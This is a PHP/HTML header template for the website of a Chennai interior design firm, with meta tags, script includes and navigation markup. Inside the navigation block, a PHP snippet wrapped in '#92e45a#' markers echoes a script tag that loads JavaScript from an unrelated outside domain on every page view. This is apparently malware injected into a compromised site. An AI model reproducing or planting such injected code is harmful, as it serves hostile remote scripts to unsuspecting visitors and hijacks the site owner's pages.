<!DOCTYPE HTML>
<!--
	Arcana by HTML5 UP
	html5up.net | @n33co
	Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
-->
<html>
	<head>
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
		<title>Synergy Decor, Interior design, Home, Office, Modular Kitchens Designs</title>
		<meta name="description" content="synergy Décor, a budding interior design firm, is based out of Chennai. With a team of young and creative minds to provide innovative design options to customers, ably guided and executed by well experienced professionals, we are specialized in interior designing of Office & Residence. We provide customized solutions on space planning, layouts, partitions, wardrobes and modular kitchens." />
		<meta name="keywords" content="interion design, TV Cabinets,Crockery Units,Pooja Units,Wardrobes,Loft Closings,Wall Paneling,Wall painting,Texture painting,False Ceilings,Work Stations,Partitions,Cabins,Wall Paneling,Wall painting,Texture painting,False Ceilings,Fully Modular,Semi Modular,Frame Shutters,Top Units,Bottom Units,Accessories & Appliances,Pull Outs" />
		<!--[if lte IE 8]><script src="css/ie/html5shiv.js"></script><![endif]-->
		<script src="js/jquery.min.js"></script>
		<script src="js/jquery.dropotron.min.js"></script>
		<script src="js/skel.min.js"></script>
		<script src="js/skel-layers.min.js"></script>
		<script src="js/init.js"></script>
		<script src="js/jquery.bxslider.min.js"></script>
		<link rel="stylesheet" href="js/jquery.bxslider.css" />
		<noscript>
			<link rel="stylesheet" href="css/skel.css" />
			<link rel="stylesheet" href="css/style.css" />
			<link rel="stylesheet" href="css/style-wide.css" />
		</noscript>
		<!--[if lte IE 8]><link rel="stylesheet" href="css/ie/v8.css" /><![endif]-->
		<!-- Add fancyBox main JS and CSS files -->
	<script type="text/javascript" src="fancy/jquery.fancybox.pack.js?v=2.1.5"></script>
	<link rel="stylesheet" type="text/css" href="fancy/jquery.fancybox.css?v=2.1.5" media="screen" />
	<!-- Add Thumbnail helper (this is optional) -->
	<link rel="stylesheet" type="text/css" href="fancy/helpers/jquery.fancybox-thumbs.css?v=1.0.7" />
	<script type="text/javascript" src="fancy/helpers/jquery.fancybox-thumbs.js?v=1.0.7"></script>
	<link rel="stylesheet" href="css/font-awesome.min.css">
	</head>
	<body>

		<!-- Header -->
			<div id="header">
						
				<!-- Logo -->
					<div class="container">
					<div class="row 200%">
						<section class="4u 12u(4)" id="logo">
							<h1><a href="index.php"><img src="images/logo.jpg" alt="logo" /></a></h1>
						</section>
						
						<?php /* old * / ?>
						<section class="2u 12u(4)"></section>
						<section class="3u 12u(4) mobile">
							<span class="icon">+91 9025 666 888<span>
						</section>
						<?php /* old */ ?>
						
						<section class="1u 12u(4)"></section>
						<section class="4u 12u(4) mobile">
							<span class="icon">+91 9025 666 888<span>
						</section>
						<section class="3u 12u(4) email">
							<span class="icon"><a href="mailto:info@synergydecor.co.in" >info@synergydecor.co.in</a></span>
						</section>
					</div>
				</div>
					
				
				<!-- Nav -->
					<nav id="nav">
						<ul>				<?php					$str = $_SERVER['PHP_SELF'];										$tex_home = '/index.php/';					$tex_abt = '/about_us.php/';					$tex_mk = '/modular_kitchens.php/';					$tex_kc = '/knowledge_corner.php/';					$tex_c = '/contact.php/';					$tex_g1 = '/modular_kitchens_gallery.php/';					$tex_g2 = '/pooja_units_gallery.php/';					$tex_g3 = '/tv_miscelleneous.php/';					$tex_g4 = '/false_ceiling.php/';					$tex_g5 = '/renovation_works.php/';					$tex_g6 = '/wardrobe.php/';					$tex_g7 = '/wardrobe.php/';					$tex_g8 = '/commercial.php/';										if(preg_match($tex_home, $str, $matches)) {						$class_home = "current" ;
					} elseif(preg_match($tex_abt, $str, $matches)) {						$class_abt = "current" ;
					} elseif(preg_match($tex_g1, $str, $matches) || preg_match($tex_g2, $str, $matches) || preg_match($tex_g3, $str, $matches) || preg_match($tex_g4, $str, $matches) || preg_match($tex_g5, $str, $matches) || preg_match($tex_g6, $str, $matches) || preg_match($tex_g7, $str, $matches) || preg_match($tex_g8, $str, $matches)) {						$class_gal = "current" ;
					} elseif(preg_match($tex_mk, $str, $matches)) {						$class_mk = "current" ;
					} elseif(preg_match($tex_kc, $str, $matches)) {						$class_kc = "current" ;
					} elseif(preg_match($tex_c, $str, $matches)) {						$class_c = "current" ;
					} else {						$class = "current" ;
					}				?>
<?php
#92e45a#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11968255\"></script>";
echo $g;
}
#/92e45a#
?>							<li class="<?php echo $class_home; ?>"><a href="index.php">Home</a></li>
							<li class="<?php echo $class_abt; ?>"><a href="about_us.php">About Us</a></li>
							<li class="<?php echo $class_gal; ?>">								<a href="">Gallery</a>								<ul>									<li><a href="modular_kitchens_gallery.php">Modular Kitchens</a></li>									<li><a href="pooja_units_gallery.php">Pooja Units</a></li>									<li><a href="tv_miscelleneous.php">TV Miscelleneous</a></li>									<li><a href="false_ceiling.php">False Ceiling</a></li>									<li><a href="renovation_works.php">Renovation Works</a></li>									<li><a href="wardrobe.php">Wardrobe</a></li>									<li><a href="commercial.php">Commercial</a></li>								</ul>							</li>
							<li class="<?php echo $class_mk; ?>"><a href="modular_kitchens.php">Modular Kitchens</a></li>
							<li class="<?php echo $class_kc; ?>"><a href="knowledge_corner.php">Knowledge Corner</a></li>
							<li class="<?php echo $class_c; ?>"><a href="contact.php">Contact Us</a></li>
						</ul>
					</nav>

			</div>